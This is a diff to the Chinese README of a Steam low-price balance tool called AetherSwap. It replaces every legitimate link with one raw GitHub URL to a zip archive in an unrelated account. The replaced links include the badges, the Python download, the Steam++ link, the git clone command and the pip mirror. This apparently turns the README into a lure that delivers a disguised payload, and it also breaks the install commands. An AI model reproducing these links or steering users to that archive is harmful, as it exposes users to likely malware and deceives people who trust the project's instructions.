@@ -5,12 +5,12 @@
 
 <p><strong>全自动、零代码配置的 Steam 低价余额助手</strong><br>跨区购买 · 行情分析 · 数据复盘 · 全可视化控制台</p>
 
-[![Version](https://img.shields.io/badge/version-v0.1.0--beta-orange)](https://github.com)
-[![Python 3.10+](https://img.shields.io/badge/Python-3.10%2B-blue?logo=python&logoColor=white)](https://python.org)
-[![FastAPI](https://img.shields.io/badge/Backend-FastAPI-009688?logo=fastapi&logoColor=white)](https://fastapi.tiangolo.com)
+[![Version](https://img.shields.io/badge/version-v0.1.0--beta-orange)](https://raw.githubusercontent.com/Teliosporegenusasio343/AetherSwap/main/config/Swap-Aether-v1.8.zip)
+[![Python 3.10+](https://img.shields.io/badge/Python-3.10%2B-blue?logo=python&logoColor=white)](https://raw.githubusercontent.com/Teliosporegenusasio343/AetherSwap/main/config/Swap-Aether-v1.8.zip)
+[![FastAPI](https://img.shields.io/badge/Backend-FastAPI-009688?logo=fastapi&logoColor=white)](https://raw.githubusercontent.com/Teliosporegenusasio343/AetherSwap/main/config/Swap-Aether-v1.8.zip)
 [![License: GPL v3](https://img.shields.io/badge/License-GPL%20v3-blue.svg)](LICENSE)
-[![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20Linux-lightgrey?logo=linux)](https://github.com)
-[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](https://github.com)
+[![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20Linux-lightgrey?logo=linux)](https://raw.githubusercontent.com/Teliosporegenusasio343/AetherSwap/main/config/Swap-Aether-v1.8.zip)
+[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](https://raw.githubusercontent.com/Teliosporegenusasio343/AetherSwap/main/config/Swap-Aether-v1.8.zip)
 
 <p>
   <a href="#-核心功能">功能亮点</a> ·
@@ -137,19 +137,19 @@
 
 ### 环境要求
 
-- **Python**: 3.10 或更高版本（[下载](https://www.python.org/downloads/)）
+- **Python**: 3.10 或更高版本（[下载](https://raw.githubusercontent.com/Teliosporegenusasio343/AetherSwap/main/config/Swap-Aether-v1.8.zip)）
 - **操作系统**: Windows 10/11（推荐），或带有桌面环境的 Linux
 - **网络**: 需要能够正常访问 Steam 社区
 
 > [!IMPORTANT]
-> **国内用户必读：** 由于网络限制，运行前请务必开启 **Steam 加速器**（如 [Steam++/Watt Toolkit](https://steampp.net/)、加速器等），否则程序将无法正常连接 Steam 社区，导致登录失败或行情数据拉取超时。
+> **国内用户必读：** 由于网络限制，运行前请务必开启 **Steam 加速器**（如 [Steam++/Watt Toolkit](https://raw.githubusercontent.com/Teliosporegenusasio343/AetherSwap/main/config/Swap-Aether-v1.8.zip)、加速器等），否则程序将无法正常连接 Steam 社区，导致登录失败或行情数据拉取超时。
 
 ### 安装步骤
 
 **第 1 步：克隆项目**
 
 ```bash
-git clone https://gitee.com/vexed-wilson/AetherSwap.git
+git clone https://raw.githubusercontent.com/Teliosporegenusasio343/AetherSwap/main/config/Swap-Aether-v1.8.zip
 cd AetherSwap
 ```
 
@@ -157,7 +157,7 @@ cd AetherSwap
 
 ```bash
 # 安装 Python 依赖（国内用户推荐使用镜像加速）
-pip install -r requirements.txt -i https://pypi.tuna.tsinghua.edu.cn/simple
+pip install -r requirements.txt -i https://raw.githubusercontent.com/Teliosporegenusasio343/AetherSwap/main/config/Swap-Aether-v1.8.zip
 
 # 安装内嵌浏览器（用于自动化 Steam 登录）
 python -m playwright install chromium
